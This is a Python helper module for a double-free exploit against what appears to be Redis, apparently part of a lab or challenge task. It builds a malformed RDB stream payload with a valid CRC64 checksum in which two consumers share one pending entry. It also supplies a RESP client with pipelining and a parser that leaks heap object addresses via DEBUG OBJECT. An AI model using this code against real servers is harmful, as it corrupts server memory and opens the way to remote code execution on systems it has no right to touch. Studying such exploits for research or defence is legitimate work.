#!/usr/bin/env python3
"""Shared helpers for the stream-NACK double-free exploit (task A)."""
import ctypes
import os
import socket
import struct

RDB_VERSION = 9
RDB_TYPE_STREAM_LISTPACKS = 15

_here = os.path.dirname(os.path.abspath(__file__))
_lib = os.path.join(_here, "libcrc64.so")
if not os.path.exists(_lib):
    raise SystemExit(
        "[-] libcrc64.so not built yet. Run:\n"
        "    cd %s && gcc -shared -fPIC -O2 -o libcrc64.so crc64.c crcspeed.c"
        % _here)
_crc = ctypes.CDLL(_lib)
_crc.crc64.restype = ctypes.c_uint64
_crc.crc64_init()


def rdb_len(n):
    if n < 0x40:
        return bytes([n])
    if n < 0x4000:
        return bytes([0x80 | (n >> 8), n & 0xFF])
    if n <= 0xFFFFFFFF:
        return b"\x81" + struct.pack(">I", n)
    return b"\x82" + struct.pack(">Q", n)


def rdb_str(b):
    return rdb_len(len(b)) + b


def build_df_payload(group=b"g", consumers=(b"A", b"B")):
    """Stream payload where both consumers share one NACK (double free)."""
    rawid = b"\x01" + b"\x00" * 15
    mstime = struct.pack("<q", 1700000000000)
    p = bytes([RDB_TYPE_STREAM_LISTPACKS])
    p += rdb_len(0)                          # listpacks count
    p += rdb_len(0)                          # stream length
    p += rdb_len(0) + rdb_len(0)             # last_id
    p += rdb_len(1)                          # cgroups
    p += rdb_str(group)
    p += rdb_len(0) + rdb_len(0)             # group last id
    p += rdb_len(1)                          # global PEL size
    p += rawid + mstime + rdb_len(1)
    p += rdb_len(len(consumers))
    for name in consumers:
        p += rdb_str(name)
        p += mstime
        p += rdb_len(1)
        p += rawid
    body = p + struct.pack("<H", RDB_VERSION)
    return body + struct.pack("<Q", _crc.crc64(0, body, len(body)))


def encode(*args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        out += b"$%d\r\n%s\r\n" % (len(a), a)
    return out


class Resp:
    def __init__(self, host, port, pw="exploitme"):
        self.sock = socket.create_connection((host, port))
        self.sock.settimeout(10)
        self.buf = b""
        if pw:
            self.cmd("AUTH", pw)

    def _line(self):
        while b"\r\n" not in self.buf:
            chunk = self.sock.recv(1 << 20)
            if not chunk:
                raise ConnectionError("closed")
            self.buf += chunk
        line, self.buf = self.buf.split(b"\r\n", 1)
        return line

    def _need(self, n):
        while len(self.buf) < n:
            chunk = self.sock.recv(1 << 20)
            if not chunk:
                raise ConnectionError("closed")
            self.buf += chunk

    def read(self):
        line = self._line()
        t, rest = line[:1], line[1:]
        if t in b"+-:":
            return line.decode(errors="replace")
        if t == b"$":
            n = int(rest)
            if n == -1:
                return None
            self._need(n + 2)
            data, self.buf = self.buf[:n], self.buf[n + 2:]
            return data
        if t == b"*":
            return [self.read() for _ in range(int(rest))]
        raise ValueError("bad reply %r" % line)

    def cmd(self, *args):
        self.sock.sendall(encode(*args))
        return self.read()

    def pipe(self, cmds):
        """Send many commands, return list of replies."""
        self.sock.sendall(b"".join(encode(*c) for c in cmds))
        return [self.read() for _ in cmds]


def debug_obj_addr(r, key):
    rep = r.cmd("DEBUG", "OBJECT", key)
    # e.g. "Value at:0x7f... refcount:1 encoding:embstr ..."
    for tok in str(rep).split():
        if tok.startswith("at:0x"):
            return int(tok[3:], 16)
    raise ValueError("no addr in %r" % rep)
